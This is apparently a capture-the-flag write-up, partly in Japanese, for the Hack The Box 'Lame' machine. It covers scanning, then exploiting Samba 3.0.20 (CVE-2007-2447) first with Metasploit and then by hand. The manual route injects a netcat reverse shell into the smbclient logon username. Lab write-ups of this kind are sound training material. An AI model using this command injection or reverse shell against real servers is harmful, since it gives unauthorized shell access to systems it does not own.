# HTB Lame Writeup（Samba CVE-2007-2447）

## Nmap

```bash
nmap -sC -sV -oN initial.txt 10.129.221.114
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

## Exploit調査

```bash
searchsploit samba 3.0.20
```

```
Samba 3.0.20 < 3.0.25rc3 - 'username map script' Command Execution
```

CVE-2007-2447
https://www.exploit-db.com/exploits/16320

## Metasploit

```bash
msfconsole
```

```bash
search usermap_script
```

```bash
use exploit/multi/samba/usermap_script
```

```bash
show options
```

```bash
set RHOSTS 10.129.221.114
set LHOST 10.10.14.X
```

```bash
run
```

```bash
cat /home/*/user.txt
cat /root/root.txt
```

## Metasploitなし

```bash
smbclient -L //10.129.221.114/ -N
```

```
Sharename       Type
---------       ----
print$          Disk
tmp             Disk
opt             Disk
IPC$            IPC
ADMIN$          IPC
```

```bash
nc -lvnp 4444
```

```bash
smbclient //10.129.221.114/tmp -N --option='client min protocol=NT1'
```

```
logon "./=`nohup nc -e /bin/sh 10.10.14.X 4444`"
```

```bash
cat /home/*/user.txt
cat /root/root.txt
```
